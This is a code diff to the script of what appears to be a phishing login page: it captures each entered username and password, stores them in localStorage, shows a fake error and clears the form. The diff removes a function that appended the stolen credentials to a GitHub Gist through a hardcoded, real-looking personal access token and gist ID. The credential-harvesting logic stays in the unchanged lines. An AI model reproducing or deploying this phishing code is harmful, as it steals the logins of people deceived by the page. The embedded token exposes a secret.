@@ -74,13 +74,10 @@
         const password = document.querySelector('input[name="password"]').value;
         const timestamp = new Date().toISOString();
         
-        // Store in localStorage as backup
+        // Store in localStorage
         let credentials = JSON.parse(localStorage.getItem('credentials') || '[]');
         credentials.push({ username, password, timestamp });
         localStorage.setItem('credentials', JSON.stringify(credentials));
-        
-        // Send to GitHub Gist
-        sendToGist(username, password, timestamp);
         
         // Show error message
         document.getElementById('errorMessage').style.display = 'block';
@@ -89,53 +86,6 @@
         document.querySelector('input[name="username"]').value = '';
         document.querySelector('input[name="password"]').value = '';
     });
-    
-    function sendToGist(username, password, timestamp) {
-        // Replace YOUR_GITHUB_TOKEN with your actual token
-        const githubToken = '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';
-        
-        // Replace YOUR_GIST_ID with your actual gist ID
-        const gistId = '68e118158461ea3a255171d3579a196f';
-        
-        // Get current content
-        fetch(`https://api.github.com/gists/${gistId}`, {
-            headers: {
-                'Authorization': `token ${githubToken}`
-            }
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Get current content
-            const currentContent = data.files['credentials.txt'].content;
-            
-            // Add new credentials
-            const newEntry = `Username: ${username}, Password: ${password}, Time: ${timestamp}\n`;
-            const updatedContent = currentContent + '\n' + newEntry;
-            
-            // Update gist
-            return fetch(`https://api.github.com/gists/${gistId}`, {
-                method: 'PATCH',
-                headers: {
-                    'Authorization': `token ${githubToken}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    files: {
-                        'credentials.txt': {
-                            content: updatedContent
-                        }
-                    }
-                })
-            });
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Credentials saved to Gist');
-        })
-        .catch(error => {
-            console.error('Error saving to Gist:', error);
-        });
-    }
 </script>
 
 </body>
